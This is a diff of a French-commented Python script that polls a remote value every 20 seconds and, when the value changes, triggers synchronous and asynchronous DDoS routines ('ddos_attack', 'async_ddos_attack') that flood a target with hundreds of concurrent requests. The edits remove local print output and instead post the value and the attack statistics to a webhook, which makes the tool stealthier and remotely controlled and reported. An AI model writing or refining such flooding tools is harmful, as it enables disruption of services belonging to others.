@@ -50,25 +50,17 @@ def envoyer():
             # Si la valeur a changé et n'est pas vide → action
             if nouvelle_val != "":
                 valeur = nouvelle_val
-                print("Nouvelle valeur détectée :", valeur)
                 requests.post(webhook, json={"content": f"Valeur trouvée : {valeur}"})
                 ddos_attack()
-
-            else:
-                print("Aucune action. Valeur vide ou identique.")
 
     except Exception as e:
         print("Erreur :", e)
 
 
 def loop_check():
-    """Boucle infinie — vérifie toutes les 20 sec."""
-    print("Démarrage du système de surveillance...")
     while True:
         envoyer()
         time.sleep(20)  # ← 20 secondes
-
-
 
 
 
@@ -80,13 +72,9 @@ import aiohttp
 async def async_ddos_attack():
     global valeur
 
-    if valeur == "":
-        print("pas possible")
-
     nombre_requetes = int(500)
     concurrence = min(100000, nombre_requetes)  # Limiter à 500 connexions simultanées
     
-    print(f"Démarrage de l'attaque avec {concurrence} connexions simultanées...")
     start_time = time.time()
     
  
@@ -120,9 +108,13 @@ async def async_ddos_attack():
     
     duration = time.time() - start_time
     
-    print(f"\nAttaque terminée en {duration:.2f} secondes")
-    print(f"Requêtes réussies : {successful}/{nombre_requetes}")
-    print(f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde")
+    temps = f"\nAttaque terminée en {duration:.2f} secondes"
+    cible = f"Requêtes réussies : {successful}/{nombre_requetes}"
+    vitesse = f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde"
+    requests.post(webhook, json=temps)
+    requests.post(webhook, json=cible)
+    requests.post(webhook, json=vitesse)
+
 
 def ddos_attack():
     global valeur 
@@ -164,9 +156,13 @@ def ddos_attack():
                     print(f"Progression : {int((i+1)/nombre_requetes*100)}% ({i+1}/{nombre_requetes})")
         
         duration = time.time() - start_time
-        print(f"\nAttaque terminée en {duration:.2f} secondes")
-        print(f"Requêtes réussies : {success_count}/{nombre_requetes}")
-        print(f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde")
+        
+        temps = f"\nAttaque terminée en {duration:.2f} secondes"
+        cible = f"Requêtes réussies : {success_count}/{nombre_requetes}"
+        vitesse = f"Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde"
+        requests.post(webhook, json=temps)
+        requests.post(webhook, json=cible)
+        requests.post(webhook, json=vitesse)
 
 
 
